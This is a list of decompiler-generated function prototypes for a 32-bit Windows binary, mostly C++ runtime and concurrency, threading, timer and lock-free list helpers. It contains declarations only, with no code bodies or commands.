_DWORD *__thiscall sub_46DD81(_DWORD *this, char a2);
int __thiscall sub_46DDAD(_DWORD **this);
void __thiscall sub_46DDC7(volatile signed __int32 *this);
void __stdcall sub_46DDE5(int a1, int a2, int a3);
HMODULE __stdcall sub_46DE43(int a1, int (__thiscall ***a2)(_DWORD, _DWORD, _DWORD), int a3);
void __stdcall sub_46DE76(int a1, int a2);
int __stdcall sub_46DECE(int (__thiscall ***a1)(_DWORD, _DWORD, _DWORD), int a2);
int sub_46DEF0();
void __thiscall sub_46DF84(void *Block);
char __thiscall sub_46DF9D(volatile signed __int32 *this);
int __thiscall sub_46DFD6(int (__thiscall ****this)(_DWORD, _DWORD, _DWORD), int a2);
char __thiscall sub_46DFF8(_DWORD *this, _DWORD *a2, int a3);
char __thiscall sub_46E052(int this, _DWORD *a2, int a3);
char __thiscall sub_46E0AB(volatile signed __int32 *this, _DWORD *a2, int a3);
char __thiscall sub_46E0F2(volatile signed __int32 *this, _DWORD *a2, int a3);
signed __int32 __thiscall sub_46E135(volatile signed __int32 *this);
int __thiscall sub_46E17D(int this, _DWORD *a2, int a3);
_DWORD *__cdecl sub_46E22D(_DWORD **a1, char a2);
int __thiscall sub_46E267(_DWORD **this);
char __thiscall sub_46E280(_DWORD *this);
int __thiscall sub_46E2B3(_DWORD **this);
char __thiscall sub_46E2CC(_BYTE *this);
char __thiscall sub_46E2F0(_BYTE *this);
char __thiscall sub_46E333(_DWORD *this);
int __thiscall sub_46E369(_DWORD *this, int a2);
int __thiscall sub_46E398(_DWORD *this, int a2);
int __thiscall sub_46E3B6(_DWORD *this, int a2);
char __thiscall sub_46E3D5(int this);
char __thiscall sub_46E45E(_DWORD *this);
bool __thiscall sub_46E4D5(int this, DWORD a2);
void __thiscall sub_46E538(int this, unsigned __int8 a2);
void __thiscall sub_46E584(_DWORD *this);
void __thiscall sub_46E5EF(_DWORD *this);
int __thiscall sub_46E673(volatile __int32 *this);
signed __int32 __thiscall sub_46E792(_DWORD ***this, void *a2);
unsigned int __thiscall sub_46E7F6(_DWORD ***this, DWORD a2);
char __thiscall sub_46E8D2(_DWORD ***this, void *a2, DWORD a3);
unsigned int __cdecl sub_46E9BA(_DWORD *a1, unsigned int a2, char a3, DWORD a4);
HANDLE *__thiscall sub_46EC9C(HANDLE *this, DWORD a2);
struct _RTL_CRITICAL_SECTION *__thiscall sub_46ED40(struct _RTL_CRITICAL_SECTION *this);
_DWORD *__thiscall sub_46ED55(_DWORD *this);
_DWORD *__thiscall sub_46ED65(_DWORD *this);
char *__thiscall sub_46ED85(char *this, int a2);
int *__thiscall sub_46EDA0(int *this, int a2);
void __thiscall sub_46EDCA(LPCRITICAL_SECTION lpCriticalSection);
void __thiscall sub_46EDD2(void **this);
int __thiscall sub_46EE08(_DWORD *this, unsigned int a2);
_DWORD *sub_46EE8E();
void __thiscall sub_46EEB0(int this);
HMODULE __stdcall sub_46EECF(int a1, volatile signed __int32 *a2, int a3);
void __stdcall sub_46EF16(volatile signed __int32 *a1, int a2);
void __thiscall sub_46EF63(int this);
char __thiscall sub_46EF88(volatile signed __int32 *this);
_DWORD *__thiscall sub_46EFBA(_DWORD *this, _DWORD *a2);
int __thiscall sub_46F022(_DWORD *this);
void __thiscall sub_46F04D(LPCRITICAL_SECTION lpCriticalSection);
signed __int32 __thiscall sub_46F055(volatile signed __int32 *this);
signed __int32 __thiscall sub_46F085(volatile signed __int32 *this);
bool __thiscall sub_46F0B3(int this, _DWORD *a2, char a3);
int __thiscall sub_46F14E(int *this);
void __thiscall sub_46F164(_DWORD *this);
int sub_46F17C(void); // weak
void __thiscall sub_46F193(LPCRITICAL_SECTION lpCriticalSection);
void __thiscall sub_46F19B(volatile signed __int32 *this);
void __thiscall sub_46F19F(volatile signed __int32 *this);
signed __int32 __thiscall sub_46F1AA(signed __int32 this, signed __int32 *a2);
char __thiscall sub_46F1F9(volatile signed __int32 *this);
int sub_46F210();
int __cdecl sub_46F216(_DWORD *a1, int a2, int a3);
signed __int32 __thiscall sub_46F253(void *this);
char __thiscall sub_46F281(signed __int32 this);
char __thiscall sub_46F2CC(void *this, DWORD a2);
void __thiscall sub_46F32A(void *this);
// _DWORD __thiscall std::regex_error::regex_error(std::regex_error *__hidden this, const struct std::regex_error *); weak
void __thiscall sub_46F3E4(char *this);
int sub_46F433();
BOOL __cdecl sub_46F4E4(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period);
BOOL __cdecl sub_46F4FB(HANDLE hObject);
int __cdecl sub_46F509(unsigned __int8 a1);
// _DWORD __cdecl __crtCreateSemaphoreExW_0(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); weak
BOOL __cdecl sub_46F574(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
DWORD __cdecl sub_46F594(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent);
int __cdecl sub_46F5C3(int a1);
struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *__cdecl sub_46F5E5(PDWORD ReturnedLength);
void *__cdecl sub_46F66C(int a1, size_t *a2);
ULONG sub_46F720();
int __cdecl sub_46F763(int a1, int a2);
int __cdecl sub_46F7BC(HANDLE hThread);
__int64 j____crtGetTickCount64(void); // weak
int __cdecl sub_46F7CF(struct _RTL_CRITICAL_SECTION *a1, DWORD a2);
HANDLE __cdecl sub_46F7E4(HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context);
int __cdecl sub_46F834(HANDLE hThread, DWORD_PTR *a2);
BOOL __cdecl sub_46F878(HANDLE hThread, int nPriority);
DWORD __cdecl sub_46F8BA(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
void __cdecl sub_46F8D1(DWORD dwMilliseconds);
// BOOL __stdcall SwitchToThread();
DWORD sub_46F8E5();
BOOL __cdecl sub_46F922(DWORD dwTlsIndex);
LPVOID __cdecl sub_46F930(DWORD dwTlsIndex);
BOOL __cdecl sub_46F93E(DWORD dwTlsIndex, LPVOID lpTlsValue);
BOOL __cdecl sub_46F980(HANDLE WaitHandle);
DWORD __cdecl sub_46F98E(HANDLE hHandle, DWORD dwMilliseconds);
int __thiscall sub_46F9A1(int this, char a2);
int *sub_46F9D5();
int __cdecl sub_46F9E3(int a1);
HMODULE __cdecl sub_46F9F0(int a1);
HMODULE __cdecl sub_46FA2C(DWORD dwExitCode);
uintptr_t sub_46FA56();
int __cdecl sub_46FAA2(struct _SECURITY_ATTRIBUTES *a1, SIZE_T a2, DWORD (__stdcall *a3)(LPVOID lpThreadParameter), void *a4, DWORD a5, DWORD *a6);
HMODULE sub_46FAE8();
int __cdecl sub_46FB7C(unsigned int a1, int a2, int a3, char a4);
int __cdecl sub_46FBDB(int a1, int a2, int a3);
HMODULE __cdecl sub_46FC14(int a1, int a2);
HMODULE __cdecl sub_46FC4A(int a1, int a2);
__int32 __thiscall sub_46FC7F(volatile __int32 *this);
__int32 __thiscall sub_46FC8F(volatile __int32 *this);
int __thiscall sub_46FCC0(_DWORD *this);
void sub_46FCCB();
char __thiscall sub_46FCD4(volatile __int32 *this);
char __thiscall sub_46FCF4(volatile __int32 *this);
int sub_46FD09();
int sub_46FD30();
int sub_46FD4D(void); // weak
_DWORD *__thiscall sub_46FD52(_DWORD *this, int a2);
char *__thiscall sub_46FD73(char *this);
_DWORD *__thiscall sub_46FE57(_DWORD *this);
char *__thiscall sub_46FE62(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
char *__thiscall sub_46FE8E(char *this, int a2);
void __thiscall sub_46FEA9(void **this);
void __thiscall sub_46FEB6(char *this);
void __thiscall sub_46FF89(LPCRITICAL_SECTION *this);
_DWORD *__thiscall sub_46FFBF(_DWORD *this);
// void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int); weak
void **__thiscall sub_47004E(void **this, char a2);
int __thiscall sub_470077(_DWORD *this, int a2);
unsigned int __thiscall sub_4700B0(int *this, unsigned int a2, unsigned int a3, unsigned int a4);
int __thiscall sub_470180(_DWORD *this, int a2);
int __cdecl sub_4701A3(int *a1);
int __cdecl sub_4701CE(_DWORD *a1);
int __thiscall sub_4701F5(DWORD_PTR *this, void *a2);
int sub_470207();
void sub_47032C();
_DWORD *__thiscall sub_470347(_DWORD *this, int a2);
unsigned int __thiscall sub_470454(_DWORD *this);
unsigned int __thiscall sub_470477(_DWORD *this);
unsigned int *__thiscall sub_4704A4(unsigned int *this);
BOOL __thiscall sub_4705DB(_DWORD *this);
_DWORD __cdecl sub_47063D();
char *__thiscall sub_470642(void *this, int a2);
char *sub_4706A4();
int __thiscall sub_470737(int this, int a2, int a3);
unsigned int __thiscall sub_4707A1(_DWORD *this);
void __thiscall sub_4707BA(_DWORD *this, void **Block);
void __thiscall sub_4707F4(unsigned int this);
_DWORD *__thiscall sub_470B06(_DWORD *this);
bool __thiscall sub_470B71(_DWORD *this);
void __thiscall sub_470D0A(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6);
void __thiscall sub_470E47(_DWORD *this, unsigned int a2, unsigned int a3);
int __thiscall sub_470FDA(int *this);
void __thiscall sub_471212(_DWORD *this, _DWORD *a2, int a3, int a4, char a5);
void __thiscall sub_47127F(_DWORD *this, _DWORD *a2, _DWORD *a3, int a4, unsigned int a5);
int __stdcall sub_4713E1(int a1);
void __thiscall sub_4713FA(int this);
unsigned int __thiscall sub_4714FA(_DWORD *this, unsigned int *a2, unsigned int *a3, int a4, int a5, unsigned int a6);
unsigned int __thiscall sub_471840(_DWORD *this, unsigned int a2, int a3, int a4);
char __thiscall sub_47195A(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5);
int __thiscall sub_471A63(_DWORD *this, __int16 a2);
_BYTE *__thiscall sub_471A97(_DWORD *this);
int sub_471AC7();
int __thiscall sub_471B12(_DWORD *this, unsigned int *a2);
int __thiscall sub_471C20(_DWORD *this);
int __thiscall sub_471C27(_DWORD *this);
int __thiscall sub_471C31(_DWORD *this);
int __thiscall sub_471C38(_DWORD *this);
int __thiscall sub_471C3F(int *this);
int __thiscall sub_471C56(int *this);
int __thiscall sub_471C6D(_DWORD *this, int a2);
int __thiscall sub_471C92(_DWORD *this, int a2);
int sub_471CB7();
int __thiscall sub_471D02(_DWORD *this);
int sub_471D09(void); // weak
_DWORD __cdecl sub_471D0E();
int sub_471D13(void); // weak
// unsigned int __cdecl Concurrency::details::platform::GetNextAsyncId();
void *__cdecl sub_471D25(int a1);
unsigned int __thiscall sub_471D4E(_DWORD *this, _DWORD *a2, int a3);
unsigned int __thiscall sub_471E6B(_DWORD *this, _DWORD *a2, int a3);
void __thiscall sub_471FB3(_DWORD *this);
char __thiscall sub_471FE9(int this, int a2, int a3, char a4);
unsigned int __thiscall sub_472026(unsigned int *this, unsigned int a2, unsigned __int16 a3, unsigned __int16 a4, unsigned int a5, unsigned int a6, char a7);
void *__thiscall sub_472139(int this);
void __cdecl sub_4721FB(char a1);
unsigned int __thiscall sub_472427(_DWORD *this);
_DWORD *__thiscall sub_472440(unsigned int *this, _DWORD *a2, int a3, char a4);
int __thiscall sub_472596(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_47265C(_DWORD *this);
void __fastcall sub_47276F(_DWORD *a1);
unsigned int __thiscall sub_472836(_DWORD *this);
unsigned int __thiscall sub_472865(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_472A77(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5);
signed __int32 __thiscall sub_472E4B(volatile signed __int32 *this);
char *__thiscall sub_472E55(void *this, int a2, int a3);
signed __int32 __thiscall sub_472E99(int this);
unsigned int __thiscall sub_472F44(_DWORD *this, int a2, unsigned int a3, unsigned int a4);
char __thiscall sub_472F99(_DWORD *this, int a2, _DWORD *a3, unsigned int a4);
int __thiscall sub_47308D(_DWORD *this, int a2);
void __thiscall sub_4730C3(int this, DWORD_PTR *a2);
_DWORD *__thiscall sub_47313A(int this, _DWORD *a2, char a3);
unsigned int __thiscall sub_47324F(_DWORD *this, int a2, unsigned int a3);
unsigned int __thiscall sub_473283(_DWORD *this, int a2, unsigned int a3, int a4);
int __thiscall sub_47345E(_DWORD *this);
__int32 sub_4734B5();
void __cdecl sub_4735A3(int a1, unsigned int a2);
char __thiscall sub_47375B(volatile signed __int32 *this);
unsigned int __thiscall sub_47377A(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_473957(_DWORD *this, int a2, char a3);
int __thiscall sub_473A26(int this, _DWORD *a2);
_DWORD *__thiscall sub_473AF8(int this, _DWORD *a2);
_DWORD *__thiscall sub_473B4C(_DWORD *this, int a2, int a3, _DWORD *a4, _DWORD *a5, int a6);
int sub_473BB5();
int __cdecl sub_473BFE(int a1);
int __cdecl sub_473C21(int a1);
int __cdecl sub_473C46(int a1);
unsigned int *__thiscall sub_473C69(unsigned int *this, unsigned int a2);
PSLIST_HEADER __thiscall sub_473CA7(PSLIST_HEADER ListHead, int a2, int a3, int a4);
_DWORD *__thiscall sub_473D9E(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_473DD6(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_473E0E(_DWORD *this);
_DWORD *__thiscall sub_473E26(_DWORD *this, int a2);
HANDLE *__thiscall sub_473E6C(HANDLE *this, const void **a2);
char *__thiscall sub_47418A(char *this, int a2);
char *__thiscall sub_4741A5(char *this, int a2);
void __thiscall sub_4741D3(PSLIST_HEADER ListHead);
void __thiscall sub_47424D(PSLIST_HEADER ListHead);
void __thiscall sub_4742C4(void **this);
void __thiscall sub_4742E5(void **this);
void __thiscall sub_4742FC(_DWORD *this);
void __thiscall sub_47430A(char *this);
int __thiscall sub_4743C3(_DWORD **this);
int __thiscall sub_4743F9(_DWORD *this, int a2);
char *__thiscall sub_474441(char *this, char a2);
_DWORD *__thiscall sub_4744C2(_DWORD *this, char a2);
void *__thiscall sub_4744E5(void *this, char a2);
_DWORD *__thiscall sub_47450A(_DWORD *this, char a2);
_DWORD *__thiscall sub_474550(_DWORD *this, char a2);
_DWORD *__thiscall sub_474573(_DWORD *this, char a2);
char *__thiscall sub_474596(char *this, char a2);
int __thiscall sub_4745BB(int this, char a2);
int __thiscall sub_47463E(int this, signed __int32 a2);
signed __int32 __thiscall sub_4747A0(volatile signed __int32 *this, int a2);
int __thiscall sub_4747D1(int *this, int a2);
_DWORD *__thiscall sub_474805(void *this, _DWORD *a2);
void __thiscall sub_474832(volatile signed __int32 *this, _DWORD *a2);
unsigned int __thiscall sub_474866(int this, int a2, unsigned int a3);
_DWORD *__thiscall sub_47491E(void *this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_474959(void *this, int a2, int a3);
int __thiscall sub_4749A5(int this);
_DWORD *__thiscall sub_4749EB(volatile signed __int32 *this, char a2);
int __thiscall sub_474A5B(volatile signed __int32 *this);
int __thiscall sub_474A7E(int this);
int __thiscall sub_474ABC(_DWORD *this, ULONG a2);
unsigned int __cdecl sub_474B72(int a1);
unsigned int __cdecl sub_474B7E(int a1);
int *sub_474B8A();
int *sub_474BB0();
int __thiscall sub_474C15(int this);
int __thiscall sub_474CC8(_DWORD *this);
int __thiscall sub_474D0B(int *this, unsigned int a2);
unsigned int __thiscall sub_474DA2(_DWORD *this);
int __thiscall sub_474E2B(int this, int a2);
_DWORD *sub_474E69();
int *__thiscall sub_474E95(int this, _DWORD *a2);
int *__thiscall sub_474E9E(void *this);
HANDLE *__cdecl sub_474EBD(int *a1);
int __thiscall sub_474EE3(int this);
signed __int32 __thiscall sub_474EFC(int this);
void __stdcall sub_474F1A(_DWORD *a1);
int __stdcall sub_474F3B(_DWORD *a1);
int __thiscall sub_474F59(int *this);
int __thiscall sub_474F76(int *this);
int __thiscall sub_474F90(int *this);
int __thiscall sub_474FC4(HANDLE *this);
int __thiscall sub_47500F(volatile signed __int32 *this, struct _SINGLE_LIST_ENTRY *a2, char a3);
LPVOID sub_475051();
int sub_47505E();
int __thiscall sub_475078(_DWORD *this);
int __thiscall sub_475095(_DWORD **this);
_DWORD *__thiscall sub_4751BF(unsigned int *this, _DWORD *a2, _DWORD *a3);
int __thiscall sub_4751F5(void *this);
int __thiscall sub_475236(unsigned int *this, _DWORD *a2);
int __stdcall sub_47528F(int a1, int a2, _DWORD *a3, _DWORD *a4);
int __thiscall sub_4752BA(_DWORD *this, int a2, int a3, _DWORD *a4);
char __thiscall sub_4752E9(unsigned int *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_4753F1(_DWORD *this);
char __thiscall sub_47541B(_DWORD *this);
int __thiscall sub_4754E2(_DWORD *this);
_DWORD *__thiscall sub_4754EB(unsigned int *this, _DWORD *a2, _DWORD *a3);
int sub_4755A1();
_DWORD *__thiscall sub_47563E(union _SLIST_HEADER *this, char a2);
int __thiscall sub_47569E(int this, char a2);
signed __int32 __thiscall sub_4757C1(volatile signed __int32 *this);
signed __int32 __thiscall sub_4757CE(volatile signed __int32 *this);
// unsigned int __cdecl Concurrency::details::platform::GetNextAsyncId();
int __thiscall sub_4757E8(int this);
int __stdcall sub_47581D(_DWORD *a1, int a2, _DWORD *a3);
int __thiscall sub_475859(_DWORD *this, int a2, int a3);
int __thiscall sub_475884(_DWORD *this);
int __thiscall sub_4758A5(_DWORD *this, int a2);
int __thiscall sub_4758C7(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_4758FC(const void **this, _DWORD *a2);
int __thiscall sub_475912(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_47596F(union _SLIST_HEADER *this);
int __thiscall sub_475986(int *this);
PSLIST_ENTRY __cdecl sub_475999(char a1);
int __thiscall sub_475A19(_DWORD *this, int a2);
void __thiscall sub_475A3C(void *this, int a2);
void __thiscall sub_475ABB(void **this, int a2);
bool __thiscall sub_475B2C(_DWORD *this);
int __cdecl sub_475B3F(int a1, unsigned int a2);
int __thiscall sub_475B6B(_DWORD *this);
int __thiscall sub_475B72(_DWORD *this);
void __thiscall sub_476023(volatile signed __int32 *this);
_DWORD *__thiscall sub_47602B(unsigned int *this, _DWORD *a2, _DWORD *a3);
int *__thiscall sub_476093(int this, _DWORD *a2);
signed __int32 __thiscall sub_476159(void *this);
bool __thiscall sub_476193(_DWORD *this, int a2);
int __thiscall sub_4761CF(int (__cdecl **this)(int), int (__cdecl *a2)(int), int (__cdecl *a3)(int), int a4);
int __thiscall sub_47620B(int this, int a2);
char __thiscall sub_47624F(_DWORD *this);
bool __thiscall sub_47626B(unsigned int *this, _DWORD *a2);
_DWORD *__thiscall sub_47629F(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__stdcall sub_4762C9(_DWORD *a1, int a2, int a3, int a4);
char __thiscall sub_4762DA(_DWORD *this, _DWORD *a2);
char __thiscall sub_4762FC(int this, struct _SINGLE_LIST_ENTRY *a2);
DWORD sub_47638C();
BOOL sub_4763A0();
void __thiscall sub_4763B9(_DWORD *this, signed __int64 a2);
int __thiscall sub_47657D(int this);
int __thiscall sub_4765F3(int this);
signed __int32 __thiscall sub_476690(volatile signed __int32 *this);
signed __int32 __thiscall sub_4766A8(volatile signed __int32 *this, volatile signed __int32 *a2);
char __thiscall sub_4766C6(unsigned int *this, struct _SINGLE_LIST_ENTRY *a2, int a3, int a4, int a5, int a6);
int __thiscall sub_476733(void **this, void *a2);
signed __int32 __thiscall sub_47676A(int this);
signed __int32 __thiscall sub_47677A(volatile signed __int32 *this);
int __thiscall sub_4767EA(volatile signed __int32 *this);
void __thiscall sub_476809(volatile signed __int32 *this, HANDLE hSourceHandle);
signed __int32 __thiscall sub_4768AB(volatile signed __int32 *this);
PSLIST_ENTRY __thiscall sub_4768C3(int this, struct _SINGLE_LIST_ENTRY *a2);
int __thiscall sub_476905(volatile signed __int32 *this);
PSLIST_ENTRY __thiscall sub_476924(int this, struct _SINGLE_LIST_ENTRY *a2, char a3);
PSLIST_ENTRY __thiscall sub_47696E(int this, int a2);
PSLIST_ENTRY __thiscall sub_4769BE(union _SLIST_HEADER *this);
BOOL __thiscall sub_476A28(HANDLE *this, LONG lReleaseCount);
int __thiscall sub_476A46(int *this, int a2);
char __thiscall sub_476A78(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4);
char __thiscall sub_476B71(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4);
int __thiscall sub_476C6A(int *this);
_DWORD *__thiscall sub_476C92(_DWORD *this);
_DWORD *__thiscall sub_476CB6(int this);
void __thiscall sub_476CEA(int this, int a2);
char __thiscall sub_476D26(union _SLIST_HEADER *this, signed __int32 a2);
char __thiscall sub_476D3E(_DWORD *this);
int __thiscall sub_476D4C(_DWORD *this, int a2, unsigned int a3);
signed __int32 __thiscall sub_476E48(volatile signed __int32 *this);
PSLIST_ENTRY __cdecl sub_476E8F(PSLIST_ENTRY ListEntry);
LPVOID sub_476ED0();
char __thiscall sub_476EEC(volatile signed __int32 *this);
int __thiscall sub_476F0E(_DWORD *this, int a2, int a3);
int __thiscall sub_476F5F(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4);
void __thiscall sub_476F9C(_DWORD *this, int a2);
int __cdecl sub_476FC1(int *a1, int a2);
int __cdecl sub_476FF2(int *a1, int a2);
char __thiscall sub_47702C(unsigned int *this, int a2, int a3, int a4, int a5, int a6);
char __thiscall sub_477052(unsigned int *this, int a2, int a3, int a4, int a5, int a6, int a7);
int sub_4770A7();
union _SLIST_HEADER *__thiscall sub_4770FD(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4);
int __thiscall sub_477239(volatile signed __int32 *this);
char __thiscall sub_4772D5(_DWORD *this);
char __stdcall sub_4773E9(int a1, _DWORD *a2, int a3);
char __stdcall sub_4773F8(_DWORD *a1, int a2);
void __stdcall Callback(_DWORD *a1, BOOLEAN a2);
int __thiscall sub_477442(_DWORD *this, int a2);
int __cdecl sub_4774D9(char a1, char a2, int a3);
int __stdcall sub_477544(char a1, unsigned __int8 a2, int a3);
int __thiscall sub_47756E(int this, _DWORD *a2);
int __thiscall sub_4775A3(_DWORD *this);
int __thiscall sub_4775D1(_DWORD *this, int a2);
unsigned int __thiscall sub_477619(_DWORD *this);
char __thiscall sub_47764B(volatile signed __int32 *this, int a2);
int __thiscall sub_4776FF(int this, char a2);
void __thiscall sub_47775C(int *this);
int __thiscall sub_4777A9(int *this, _DWORD *a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
char *__thiscall sub_477800(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
char *__thiscall sub_47784E(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
char *__thiscall sub_47787A(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
_DWORD *__thiscall sub_4778B7(_DWORD *this, int a2);
_DWORD *__thiscall sub_4778D4(_DWORD *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
_DWORD *__thiscall sub_477902(_DWORD *this);
void *__thiscall sub_47791B(void *this, int a2, char a3);
void __thiscall sub_4779ED(void **this);
void __thiscall sub_477A04(void **this);
void __thiscall sub_477A1B(int this);
void __thiscall sub_477A57(_DWORD *this);
void __thiscall sub_477A5E(void *this);
void __thiscall sub_477A8C(void **this);
void __thiscall sub_477AA3(void *this);
bool __thiscall sub_477ADC(_DWORD *this, _DWORD *a2);
int __thiscall sub_477AFF(_DWORD *this, int a2);
_DWORD *__thiscall sub_477B33(_DWORD *this, char a2);
void *__thiscall sub_477B56(void *this, char a2);
void **__thiscall sub_477B7B(void **this, char a2);
int __thiscall sub_477BA7(int this, signed __int32 a2);
void __thiscall sub_477D09(volatile signed __int32 *this, int a2, char a3);
int __thiscall sub_477D33(int *this, _DWORD *a2);
void __thiscall sub_477D62(int this, _DWORD *a2);
void __thiscall sub_477D96(int this, signed __int32 a2);
signed __int32 __thiscall sub_477DFD(volatile signed __int32 *this, signed __int32 a2);
void __thiscall sub_477E2D(int this, int a2);
char __cdecl sub_477F1D(int a1);
char __thiscall sub_477F29(int *this, _DWORD *a2);
int __thiscall sub_477F70(int this);
void __thiscall sub_477FA1(int *this);
BOOL sub_477FE0();
int __thiscall sub_477FF0(int this);
void **__stdcall sub_478070(_DWORD *a1);
int __thiscall sub_478092(int this);
char __thiscall sub_4780AD(int *this);
int __thiscall sub_4781EF(_DWORD *this);
int __thiscall sub_4781F7(_DWORD *this);
int __thiscall sub_478202(_DWORD *this);
int __thiscall sub_47820A(_DWORD *this);
char __thiscall sub_478215(unsigned int *this, _DWORD *a2, _DWORD *a3);
_DWORD *__thiscall sub_478257(_DWORD *this, int a2);
int __thiscall sub_47829F(_DWORD *this);
int __thiscall sub_4782B3(_DWORD *this);
int __thiscall sub_4782B7(_DWORD *this);
int __thiscall sub_4782C8(_DWORD *this);
bool __thiscall sub_4782F0(_DWORD *this, int a2, int a3);
int __thiscall sub_4783D0(int this, int a2);
int __thiscall sub_4783F3(int *this, int *a2);
int __thiscall sub_478424(__int32 *this);
void *__thiscall sub_478475(_DWORD *this);
BOOL __thiscall sub_478493(_DWORD *this, int a2);
char __thiscall sub_4784AE(int this);
void __thiscall sub_478531(volatile signed __int32 *this);
char __thiscall sub_478536(int *this);
_DWORD *__thiscall sub_47858D(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_4785DB(_DWORD *this, _DWORD **a2);
char __thiscall sub_478609(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4);
void __thiscall sub_4786FA(int this, _DWORD **a2);
void __thiscall sub_47872E(void *this, int a2);
BOOL __thiscall sub_478744(void *this);
void __cdecl sub_478753(void **a1);
int sub_478772(void); // weak
// void __usercall sub_478777(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_4787F9(volatile __int32 **this, unsigned __int8 (__cdecl *a2)(int, int), int a3, int (__cdecl *a4)(int, int));
int __thiscall sub_478805(void *this);
int __cdecl sub_47889E(char a1, char a2, int a3, int a4);
int __stdcall sub_47890F(char a1, unsigned __int8 a2, int a3, int a4);
int __thiscall sub_47893C(__int32 *this, int a2);
int __thiscall sub_47899F(_DWORD *this, int a2);
int __thiscall sub_4789AE(_DWORD *this);
signed __int32 __cdecl sub_4789C2(volatile signed __int32 *a1, signed __int32 a2, signed __int32 a3);
int __thiscall sub_4789E7(int this, int a2, int a3, int a4);
char *__thiscall sub_478A12(char *this, int a2);
char *__thiscall sub_478A5B(char *this, int a2);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); weak
volatile __int32 *__thiscall sub_478A87(volatile __int32 *this, int a2, char a3);
char *__thiscall sub_478B68(char *this, int a2);
void __thiscall sub_478BD0(void **this);
void __thiscall sub_478BE0(char *this);
void __thiscall sub_478C05(int this);
_DWORD *__thiscall sub_478D0A(_DWORD *this, char a2);
char *__thiscall sub_478D36(char *this, char a2);
char *__thiscall sub_478D58(char *this, char a2);
void *__thiscall sub_478D9D(void *this, char a2);
_DWORD *__thiscall sub_478DEF(unsigned int *this, int a2, int a3);
_DWORD *__thiscall sub_478E12(unsigned int *this, int a2);
int __thiscall sub_478E74(_DWORD *this);
void __thiscall sub_478E8B(int this, char a2);
int __thiscall sub_478FBA(void *this, volatile __int32 **a2);
volatile __int32 *__thiscall sub_479002(_DWORD *this);
int __cdecl sub_479083(volatile signed __int32 *a1, signed __int32 *a2, signed __int32 a3, int a4, int a5);
void __thiscall sub_4790F3(int this);
void __thiscall sub_479148(volatile __int32 *this, int a2, int a3);
void __stdcall sub_4791E7(int a1, int a2);
void __thiscall sub_479206(volatile signed __int32 *this, int a2);
void __thiscall sub_4792A9(int this, int a2, char a3);
// _DWORD __cdecl std::_Cnd_broadcastX(_Cnd_t); weak
bool __cdecl sub_479353(int a1, _DWORD *a2);
int __cdecl sub_479366(volatile signed __int32 *a1, signed __int32 *a2, signed __int32 a3);
signed __int32 __thiscall sub_47938D(int this);
int __thiscall sub_4793BB(int this, int a2);
int __thiscall sub_479492(int (__thiscall ***this)(void *, int));
int __thiscall sub_4794AF(int this);
unsigned int __thiscall sub_4794C3(int this, int a2);
char __thiscall sub_4795A0(int this);
_DWORD *__thiscall sub_4795EB(_DWORD *this);
signed __int32 __thiscall sub_479601(volatile signed __int32 *this);
bool __thiscall sub_479689(_DWORD *this);
bool __thiscall sub_47969B(_DWORD *this);
bool __thiscall sub_4796AD(_DWORD *this);
bool __thiscall sub_4796B8(_DWORD *this);
int __thiscall sub_4796C0(int this, int a2);
int __thiscall sub_47970F(_DWORD *this);
int __thiscall sub_479713(void *this, int a2, int a3, int a4);
int __thiscall sub_479750(int this, int a2);
signed __int32 __thiscall sub_4797C2(volatile signed __int32 *this);
